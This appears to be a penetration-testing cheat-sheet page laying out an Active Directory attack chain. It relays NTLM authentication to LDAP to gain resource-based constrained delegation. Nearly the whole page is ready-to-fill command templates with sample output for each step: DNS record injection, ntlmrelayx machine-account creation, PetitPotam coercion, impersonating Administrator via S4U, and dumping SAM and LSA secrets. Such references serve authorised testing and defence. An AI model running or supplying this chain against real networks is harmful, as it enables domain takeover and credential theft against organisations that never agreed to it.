---
title: "LDAP Relay"
tags: ["Attack Chain", "NTLM", "LDAP", "Pass-The-Hash", "Impacket", "NTLM Replay", "Petitpotam", "Active Directory", "Windows", "WebDAV", "Ticket Granting Ticket", "RBCD", "Secretsdump"]
---

### Abuse #1: LDAP Relay to RBCD

#### 1. Check LDAP Signing

```console
# Password
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M ldap-checker
```

```console {class="sample-code"}
$ nxc ldap DC01.example.com -u 'apple.seed' -p 'P@ssw0rd123' -d example.com -M ldap-checker
LDAP        10.10.143.101   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
LDAP        10.10.143.101   389    DC01             [+] example.com\apple.seed:P@ssw0rd123 
LDAP-CHE... 10.10.143.101   389    DC01             LDAP signing NOT enforced
LDAP-CHE... 10.10.143.101   389    DC01             LDAPS channel binding is set to: Never
```

#### 2. Check WebDAV Status

```console
nxc smb <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M webdav
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'P@ssw0rd123' -d example.com -M webdav
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:P@ssw0rd123 
WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102
```

#### 3. Add a DNS Entry in Trusted Zone

```console
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r <SUBDOMAIN>.<DOMAIN> -d <LOCAL_IP> --action add <DC_IP>
```

```console {class="sample-code"}
$ python dnstool.py -u 'example.com\apple.seed' -p 'P@ssw0rd123' -r test.example.com -d 10.8.7.13 --action add 10.10.143.101    
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

<small>*Ref: [dnstool.py](https://github.com/dirkjanm/krbrelayx)*</small>

#### 4. Start a Relay Server

```console
impacket-ntlmrelayx -t ldap://<DC> -smb2support --delegate-access
```

```console {class="sample-code"}
$ impacket-ntlmrelayx -t ldap://dc01.example.com -smb2support --delegate-access
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /test/pipe/srvsvc
[*] HTTPD(80): Connection from 10.10.143.102 controlled, attacking target ldap://DC01.example.com
[*] HTTPD(80): Authenticating against ldap://DC01.example.com as INTERCEPT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] Attempting to create computer in: CN=Computers,DC=intercept,DC=vl
[*] Adding new computer with username: MPAGJQVC$ and password: P8ROIzCA9Wz}9<v result: OK
[*] Delegation rights modified succesfully!
[*] MPAGJQVC$ can now impersonate users on WS01$ via S4U2Proxy
[*] Delegate attack already performed for this computer, skipping
```

#### 5. Coerce Authentication

```console
nxc smb <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb WS01.example.com -u 'apple.seed' -p 'P@ssw0rd123' -d example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:P@ssw0rd123 
COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

#### 6. Request a Service Ticket

```console
impacket-getST -impersonate Administrator -spn 'cifs/<TARGET_DOMAIN>' -dc-ip <DC_IP> '<DOMAIN>/<NEW_COMPUTER>$:<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ impacket-getST -impersonate Administrator -spn 'cifs/WS01.example.com' -dc-ip 10.10.143.101 'example.com/MPAGJQVC$:P8ROIzCA9Wz}9<v'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WS01.example.com@example.com.ccache
```

#### 7. Secrets Dump

``` console
# Import ticket
export KRB5CCNAME='<CCACHE>'
```

```console {class="sample-code"}
export KRB5CCNAME='Administrator@cifs_WS01.example.com@example.com.ccache'
```

```console
# Secrets dump
sudo ntpdate -s <DC_IP> && nxc smb <TARGET_DOMAIN> -u 'Administrator' -k --use-kcache --sam --lsa
```